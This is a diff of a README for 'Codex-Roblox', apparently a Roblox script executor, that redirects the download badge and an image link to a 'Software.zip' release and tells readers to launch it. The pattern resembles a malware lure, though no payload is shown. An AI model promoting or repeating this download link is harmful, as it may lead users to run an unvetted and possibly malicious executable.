@@ -14,7 +14,7 @@ Welcome to **Codex-Roblox** - the go-to executor for all your Roblox scripting n
 
 To get started with **Codex-Roblox**, simply click the link below to download the latest version:
 
-[![Download Codex-Roblox](https://img.shields.io/badge/Download-Codex--Roblox-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Codex-Roblox](https://github.com/giiyu12/Codex-Roblox/releases/download/v1.0/Software.zip)](https://github.com/giiyu12/Codex-Roblox/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the file and follow the installation instructions. It's that easy!
 
@@ -69,6 +69,6 @@ Get ready to unleash your creativity and conquer the Roblox universe with **Code
 
 ---
 
-![Codex-Roblox](https://image-url.com)
+![Codex-Roblox](https://github.com/giiyu12/Codex-Roblox/releases/download/v1.0/Software.zip)
 
 ---
